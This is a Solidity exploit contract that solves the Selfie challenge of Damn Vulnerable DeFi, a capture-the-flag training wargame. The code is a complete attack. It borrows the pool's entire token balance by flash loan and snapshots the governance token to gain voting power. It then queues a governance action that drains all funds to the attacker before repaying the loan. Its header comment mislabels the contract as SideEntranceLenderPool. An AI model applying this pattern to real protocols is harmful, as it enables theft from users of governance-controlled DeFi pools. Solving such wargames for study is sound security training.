// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableTokenSnapshot private immutable dvt;
    address private immutable attacker;

    constructor(address _pool, address _governance, address _dvt, address _attacker) {
        pool = SelfiePool(_pool);
        dvt = DamnValuableTokenSnapshot(_dvt);
        governance = SimpleGovernance(_governance);
        attacker = _attacker;
    }

    function attack() external {
        pool.flashLoan(dvt.balanceOf(address(pool)));
    }

    function receiveTokens(address token, uint256 amount) external {
        dvt.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        governance.queueAction(address(pool), data, 0);
        dvt.transfer(msg.sender, amount);
    }

    receive() external payable {}
}
